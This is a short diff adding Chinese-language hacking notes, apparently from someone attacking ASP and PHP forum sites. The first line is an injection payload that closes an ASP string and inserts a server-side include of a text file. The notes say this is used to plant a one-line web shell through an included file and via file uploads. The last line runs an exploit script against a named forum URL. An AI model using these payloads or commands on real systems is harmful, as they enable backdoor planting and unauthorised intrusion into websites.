@@ -1,0 +1,10 @@
+"%><!--#include file="201311685824441.txt"--><%'
+
+
+上面 插一句话、、  INC 的时候用的语句  
+
+<!--#include file="1.txt"-->
+ 上传文件包含、、、  
+
+
+cmd中php.exe exp.php URL(不需要x.php)http://www.ainu.com/forum
